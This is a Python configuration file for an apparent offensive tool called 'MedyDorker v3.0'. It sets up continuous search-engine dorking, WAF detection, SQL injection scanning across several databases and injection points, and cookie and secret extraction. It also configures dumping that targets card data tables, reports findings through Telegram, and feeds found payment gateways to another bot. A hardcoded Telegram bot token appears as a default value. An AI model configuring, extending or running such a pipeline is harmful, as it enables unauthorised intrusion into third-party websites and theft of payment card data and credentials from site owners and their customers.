"""
MedyDorker v3.0 — Master Configuration

Full-pipeline config: Dorker → Scanner → Exploiter → Dumper → Reporter
"""

import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class DorkerConfig:
    """Configuration for MedyDorker v3.0."""
    
    # =============== TELEGRAM ===============
    telegram_bot_token: str = os.getenv("DORKER_BOT_TOKEN", "8187477232:AAEh3X22b1ddY9ZaVxc0x-j9MZQyTK9Wbp4")
    telegram_chat_id: str = os.getenv("DORKER_CHAT_ID", "")
    telegram_group_id: str = os.getenv("DORKER_GROUP_ID", "")  # Group for findings
    
    # =============== DORK GENERATOR ===============
    params_dir: str = os.path.join(os.path.dirname(__file__), "params")
    max_dorks: int = 50000
    max_per_pattern: int = 500
    dork_shuffle: bool = True
    
    # =============== SEARCH ENGINE ===============
    search_delay_min: int = 8
    search_delay_max: int = 25
    results_per_dork: int = 15
    engines: List[str] = field(default_factory=lambda: [
        "duckduckgo", "bing", "startpage", "yahoo",
        "ecosia", "qwant", "brave",
    ])
    engine_shuffle: bool = True
    engine_fallback: bool = True
    
    # =============== PROXY ===============
    use_proxies: bool = False  # Set True only if you have working proxies
    proxy_file: str = os.path.join(os.path.dirname(__file__), "proxies.txt")
    rotate_proxy_every: int = 5
    proxy_timeout: int = 15
    
    # =============== WAF DETECTION ===============
    waf_detection_enabled: bool = True
    waf_skip_extreme: bool = True  # Skip targets with extreme protection
    waf_skip_high: bool = False
    waf_timeout: int = 10
    waf_max_concurrent: int = 20
    
    # =============== SECRET EXTRACTION ===============
    secret_extraction_enabled: bool = True
    secret_timeout: int = 10
    secret_max_concurrent: int = 20
    
    # =============== SQL INJECTION SCANNER ===============
    sqli_enabled: bool = True
    sqli_timeout: int = 15
    sqli_max_concurrent: int = 10
    sqli_delay: int = 5  # For time-based injection
    sqli_techniques: List[str] = field(default_factory=lambda: [
        "error", "union", "boolean", "time"
    ])
    sqli_dbms: List[str] = field(default_factory=lambda: [
        "mysql", "mssql", "postgresql", "oracle", "sqlite"
    ])
    
    # =============== DATA DUMPER ===============
    dumper_enabled: bool = True
    dumper_max_rows: int = 500
    dumper_timeout: int = 20
    dumper_output_dir: str = os.path.join(os.path.dirname(__file__), "dumps")
    dumper_targeted: bool = True  # Focus on card data tables
    dumper_dios: bool = True  # Try DIOS technique
    
    # =============== DEEP CRAWLER ===============
    deep_crawl_enabled: bool = True
    deep_crawl_max_pages: int = 50
    deep_crawl_max_depth: int = 3
    deep_crawl_timeout: int = 10
    
    # =============== REPORTER ===============
    reporter_rate_limit: float = 1.0  # Min seconds between messages
    reporter_batch_size: int = 5
    reporter_status_interval: int = 3600  # Status update every N seconds
    report_gateways: bool = True
    report_cards: bool = True
    report_sqli: bool = True
    report_dumps: bool = True
    report_secrets: bool = True
    
    # =============== MADY BOT INTEGRATION ===============
    mady_bot_feed: bool = True  # Auto-feed found gateways to Mady bot
    mady_bot_path: str = os.getenv("MADY_BOT_PATH", "/home/null/Desktop/Mady7.0.2/Mady_Version7.0.0")
    
    # =============== DAEMON MODE ===============
    continuous: bool = True
    cycle_delay: int = 120  # Seconds between dork cycles
    max_cycles: int = 0  # 0 = infinite
    
    # =============== STORAGE ===============
    found_sites_file: str = os.path.join(os.path.dirname(__file__), "found_sites.json")
    seen_domains_file: str = os.path.join(os.path.dirname(__file__), "seen_domains.txt")
    vulnerable_urls_file: str = os.path.join(os.path.dirname(__file__), "vulnerable_urls.json")
    gateway_keys_file: str = os.path.join(os.path.dirname(__file__), "gateway_keys.json")
    sqlite_db_path: str = os.path.join(os.path.dirname(__file__), "dorker.db")
    use_sqlite: bool = True  # Use SQLite instead of JSON files
    
    # =============== SEARCH PAGINATION ===============
    search_max_pages: int = 3  # Search pages 1-3 per engine per dork
    engine_health_cooldown: int = 300  # Seconds to cool down a failing engine
    
    # =============== CONCURRENT PROCESSING ===============
    concurrent_url_limit: int = 5  # Max URLs processed in parallel
    
    # =============== CIRCUIT BREAKER ===============
    circuit_breaker_threshold: int = 3  # Failures before blocking domain
    circuit_breaker_timeout: int = 1800  # 30 minutes block
    
    # =============== COOKIE EXTRACTION ===============
    cookie_extraction_enabled: bool = True  # Extract cookies from every scanned URL
    cookie_injection_enabled: bool = True  # Test cookies for SQLi
    header_injection_enabled: bool = True  # Test headers for SQLi
    post_discovery_enabled: bool = True  # Discover & test POST forms
    b3_extraction_enabled: bool = True  # Prioritize b3 tracing cookies
    
    # =============== SOFT-404 DETECTION ===============
    soft404_detection: bool = True
    soft404_similarity_threshold: float = 0.85  # Pages >85% similar to 404 are soft-404s
    
    # =============== SKIP DOMAINS ===============
    skip_domains: List[str] = field(default_factory=lambda: [
        "github.com", "github.io", "githubusercontent.com",
        "stackoverflow.com", "stackexchange.com",
        "stripe.com", "stripe.dev",
        "npmjs.com", "npmjs.org",
        "pypi.org", "pypi.python.org",
        "docs.google.com", "drive.google.com",
        "youtube.com", "youtu.be",
        "twitter.com", "x.com",
        "facebook.com", "fb.com",
        "linkedin.com",
        "reddit.com",
        "wikipedia.org", "wikimedia.org",
        "medium.com",
        "wordpress.org", "wordpress.com",
        "w3schools.com",
        "developer.mozilla.org",
        "mozilla.org",
        "apache.org",
        "docker.com",
        "heroku.com",
        "vercel.app",
        "netlify.app",
        "replit.com",
        "codepen.io",
        "jsfiddle.net",
        "pastebin.com",
        "archive.org",
        "web.archive.org",
        "amazon.com", "amazonaws.com",
        "microsoft.com",
        "apple.com",
        "google.com",
        "cloudflare.com",
        "akamai.com",
        "fastly.com",
        "bitbucket.org",
        "gitlab.com",
        "sourceforge.net",
        "example.com",
        "localhost",
    ])
    
    # =============== VALIDATION ===============
    validation_timeout: int = 15
    max_concurrent_validations: int = 10
    min_content_length: int = 500  # Skip pages with less content
    
    # =============== PRIORITY CATEGORIES =============== 
    # (used by generator for weighted selection)
    primary_categories: List[str] = field(default_factory=lambda: [
        "cards", "gateways",
    ])
    secondary_categories: List[str] = field(default_factory=lambda: [
        "secrets", "sqli", "databases", "cloud",
    ])
